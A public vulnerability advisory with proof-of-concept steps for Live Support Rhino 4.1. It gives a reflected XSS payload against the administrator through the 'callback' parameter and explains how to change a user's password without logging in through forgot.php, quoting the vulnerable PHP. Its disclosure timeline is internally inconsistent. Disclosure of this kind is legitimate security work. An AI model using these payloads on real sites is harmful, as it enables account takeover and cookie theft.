Change Password
Author:         Slotleet
Email:            Slotleet@Gmail.com
Affected Software:  Successfully tested on Live http support (RHINO) 4.1
Vendor URL:     http://www.livesupportrhino.com
Vendor Status:      Not Fixed

==========================
Vulnerability Description
==========================

The Live http Support (RHINO) 4.1 (Backend) is prone to XSS & Remote Change
Password

==========================
PoC-Exploit
==========================

// Non-Persistent XSS  with "callback" Parameter in
/include/proactive_cross.php

(1) Under "callback" set your GET Parameter Callback to
"><script>alert(document.cookie)</script>

The Non-Persistent XSS will be executed for the Administrator in the
browser (he directly logged in because you chatting with him)

// Remote Change Password - with "Forgot.php"

http://[target]/rhino/operator/index.php?p=forgot

(1) in the forgot file there&#039;s no condition if the user logged in or not,
so we can look deeply in the file in line (27-67)

if ($_SERVER["REQUEST_METHOD"] == &#039;POST&#039; && isset($_POST[&#039;newP&#039;])) {
    $defaults = $_POST;

    $femail = filter_var($_POST[&#039;f_email&#039;], FILTER_SANITIZE_EMAIL);
    $pass = $_POST[&#039;f_pass&#039;];
    $newpass = $_POST[&#039;f_newpass&#039;];

    if ($pass != $newpass) {
        $errors[&#039;e1&#039;] = $tl[&#039;error&#039;][&#039;e10&#039;];
    } elseif (strlen($pass) <= &#039;5&#039;) {
        $errors[&#039;e1&#039;] = $tl[&#039;error&#039;][&#039;e11&#039;];
    }

    if ($defaults[&#039;f_email&#039;] == &#039;&#039; || !filter_var($defaults[&#039;f_email&#039;],
FILTER_VALIDATE_EMAIL)) {
        $errors[&#039;e&#039;] = $tl[&#039;error&#039;][&#039;e3&#039;];
    }

    $fwhen = 0;

    $user_check = $lsuserlogin->lsForgotpassword($femail, $fwhen);
    if ($user_check == true && count($errors) == 0) {

    // The new password encrypt with hash_hmac
    $passcrypt = hash_hmac(&#039;sha256&#039;, $pass, DB_PASS_HASH);

    $result2 = $lsdb->query(&#039;UPDATE &#039;.DB_PREFIX.&#039;user SET password =
"&#039;.$passcrypt.&#039;", forgot = 0 WHERE email = "&#039;.smartsql($femail).&#039;"&#039;);

    $result = $lsdb->query(&#039;SELECT username FROM &#039;.DB_PREFIX.&#039;user WHERE
email = "&#039;.smartsql($femail).&#039;" LIMIT 1&#039;);
    $row = $result->fetch_assoc();

    if (!$result) {
        ls_redirect(JAK_PARSE_ERROR);
    } else {
        $lsuserlogin->lsLogin($row[&#039;username&#039;], $pass, 0);
        ls_redirect(BASE_URL);
    }

    } else {
        $errorsf = $errors;
    }
}

So there is an MySQL Query to execute if the email in the database (Show up
the change password settings).

ALL YOU HAVE TO DO IS DISCOVER THE E-MAIL ADDRESS THAT PUTTED WHEN ADMIN
INSTALLED THE SCRIPT.


==========================
Solution
==========================

Send activation code to the e-mail address.

==========================
Disclosure Timeline
==========================

30-Jan-2014 - developer informed by email
30-Jan-2014 - Developer didn&#039;t Respond
31-Jan-2014 - Still Not Respond
06-Feb-2014 - Vulnerability Discovered

==========================
Credits
==========================

Vulnerabilities found and advisory written by Slotleet.

